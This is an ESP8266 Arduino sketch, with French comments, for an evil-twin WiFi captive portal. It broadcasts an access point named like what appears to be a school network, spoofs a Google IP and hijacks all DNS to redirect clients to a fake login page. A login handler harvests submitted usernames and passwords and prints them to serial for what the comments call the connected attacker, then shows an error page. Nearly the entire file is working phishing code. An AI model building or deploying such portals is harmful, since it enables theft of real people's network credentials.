#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

AsyncWebServer http(80);
DNSServer dnsServer;

#ifndef STASSID
#define STASSID "FLPalunos"
#define STAPSK "lfpalu30"
#endif

#include <ESP8266WiFi.h>
#include <FS.h>
#include <LittleFS.h>


#define captiveUrl "http://172.217.28.254/"

void setup() {
  Serial.begin(115200);

  // Créer le serveur DHCP pour le point d'accès
  auto& server = WiFi.softAPDhcpServer();
  
  // Créer le point d'accès
  WiFi.softAPConfig(  // enable AP, with android-compatible google domain
    IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
  // Définir le nom du point d'accès
  WiFi.softAP(STASSID, STAPSK);
  // Reglages du DNS
  dnsServer.setTTL(3600);
	dnsServer.start(53, "*", WiFi.softAPIP());
  // Définir l'addresse du DNS
  server.setDns(WiFi.softAPIP());

  if(!LittleFS.begin()){
    Serial.println("An Error has occurred while mounting LittleFS");
    return;
  }

	// Bugs de systèmes communs
	http.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });	// Windows 11: nécessaire, ou ne fonctionne pas
	http.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });								// Empeche Windows 10 de causer un kernel panic sur l'esp

	// Pour le reste
	http.onNotFound([](AsyncWebServerRequest *request) {
		request->redirect(captiveUrl);
	});

  // Quand on reçoit des informations, on les envoie vers l'attaqueur connecté.
  http.on("/login", [](AsyncWebServerRequest *request){
    String username;
    String password;
    if (request->hasParam("auth_user", true) && request->hasParam("auth_pass", true)) {
      username = request->getParam("auth_user", true)->value();
      password = request->getParam("auth_pass", true)->value();
      Serial.printf("{\"username\": \"%s\",\"password\": \"%s\"}\n", username.c_str(), password.c_str());
    }
    request->redirect("/error.html");
  });

  // Hôter les fichiers nécessaires pour le login
  http.serveStatic("/", LittleFS, "/www/").setDefaultFile("portal.html");

  Serial.println("\nSTARTED\n");
  // Commencer le serveur
  http.begin();
}

void loop() {
  // Résoudre les requêtes DNS
  dnsServer.processNextRequest();
  delay(30);
}